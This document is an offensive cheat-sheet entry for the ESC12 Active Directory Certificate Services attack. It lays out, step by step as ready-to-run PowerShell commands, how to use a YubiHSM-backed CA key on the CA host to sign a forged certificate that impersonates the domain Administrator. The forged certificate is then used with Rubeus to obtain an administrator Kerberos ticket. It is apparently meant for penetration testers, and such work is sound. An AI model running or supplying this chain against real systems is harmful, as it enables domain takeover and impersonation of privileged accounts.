---
technique: ESC12 - YubiHSM Key Abuse
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc12 certificate-services pkinit
---

# ESC12 - YubiHSM Key Abuse

ESC12 abuses YubiHSM-backed CA key access from the CA host to sign attacker-controlled certificates.

## Windows

### certutil: Step 1: import CA cert to user store (ESC12)

#powershell #certutil #yubihsm #shell-access

Import the CA certificate into the current user's personal certificate store on the CA server.

```powershell title:"ESC12: import CA cert into user cert store"
certutil -addstore -user my .\root-ca.cer
```
<!-- cheat
import domain_ip
import users
-->

### certutil: Step 2: bind CA cert to YubiHSM private key (ESC12)

#powershell #certutil #yubihsm

Bind the imported CA certificate to its private key held in the YubiHSM2 KSP.

```powershell title:"ESC12: bind CA cert to YubiHSM2 KSP private key"
certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my "$ca_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
-->

### certipy: Step 3: export request cert without key (ESC12)

#powershell #certipy #yubihsm #forge

Extract the certificate from a user PFX before signing it with the CA key.

```powershell title:"ESC12: extract certificate from user PFX"
certipy cert -pfx "$user_pfx" -nokey -out "$user_cert.crt"
```
<!-- cheat
var user_pfx
var user_cert
-->

### certipy: Step 4: export request key without cert (ESC12)

#powershell #certipy #yubihsm #forge

Extract the private key from a user PFX before rebuilding the forged certificate chain.

```powershell title:"ESC12: extract private key from user PFX"
certipy cert -pfx "$user_pfx" -nocert -out "$user_cert.key"
```
<!-- cheat
var user_pfx
var user_cert
-->

### certutil: Step 5: sign forged cert with CA key (ESC12)

#powershell #certutil #yubihsm #forge

Sign a forged certificate containing a custom SAN to impersonate administrator using the CA key via YubiHSM2.

```powershell title:"ESC12: sign forged cert with YubiHSM2-backed CA key"
certutil -sign .\$user_cert.crt new.crt @extension.inf
```
<!-- cheat
import domain_ip
import users
var user_cert
-->

### certutil: Step 6: export signed cert to PFX (ESC12)

#powershell #openssl #forge

Export the signed cert and key to a PFX for use with Rubeus.

```powershell title:"ESC12: export signed cert to PFX with openssl"
openssl.exe pkcs12 -export -in new.crt -inkey $user_cert.key -out administrator.pfx
```
<!-- cheat
import domain_ip
var user_cert
-->

### certutil: Step 7: PKINIT as administrator (ESC12)

#powershell #rubeus #pkinit

Authenticate with PKINIT using the forged certificate to get an administrator TGT.

```powershell title:"ESC12: PKINIT with forged cert via Rubeus"
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /domain:"$domain" /dc:"$dc_name" /show /nowrap
```
<!-- cheat
import domain_ip
import users
var dc_name
-->
